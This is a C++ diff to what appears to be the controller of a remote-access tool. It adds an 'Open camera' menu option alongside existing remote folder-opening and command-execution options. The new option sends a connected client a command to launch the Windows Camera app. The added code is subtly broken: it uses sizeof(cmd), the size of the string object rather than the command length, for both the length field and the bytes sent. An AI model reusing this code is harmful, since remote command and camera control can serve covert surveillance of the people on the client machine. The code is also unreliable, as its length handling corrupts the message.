@@ -123,7 +123,8 @@ int main() {
         if(choice == TYPE_EXECUTE) {
             while(true) {
                 std::cout << CONSOLE_PREFIX << " 1 - Open a folder\n";
-                std::cout << CONSOLE_PREFIX << " 2 - Execute a command\n\n";
+                std::cout << CONSOLE_PREFIX << " 2 - Execute a command\n";
+                std::cout << CONSOLE_PREFIX << " 3 - Open camera\n\n";
 
                 int choice;
                 std::cout << CONSOLE_PREFIX << " Choose an option: ";
@@ -185,6 +186,22 @@ int main() {
                         send(clientFileDescriptor, cmd.c_str(), cmdLen, 0);
 
                         std::cout << SUCCESS_PREFIX << " Command: '" << cmd << "' executed\n";
+                        break;
+                    }
+
+                    case 3: {
+                        std::string cmd = "explorer.exe \"shell:AppsFolder\\Microsoft.WindowsCamera_8wekyb3d8bbwe!App\"";
+
+                        int type = TYPE_EXECUTE;
+                        send(clientFileDescriptor, &type, sizeof(type), 0);
+
+                        int subtype = 3;
+                        send(clientFileDescriptor, &subtype, sizeof(subtype), 0);
+
+                        int32_t cmdLen = sizeof(cmd);
+                        send(clientFileDescriptor, &cmdLen, sizeof(cmdLen), 0);
+                        send(clientFileDescriptor, cmd.c_str(), sizeof(cmd), 0);
+                        std::cout << SUCCESS_PREFIX << " Sent camera execution cmd\n";
                         break;
                     }
                 }
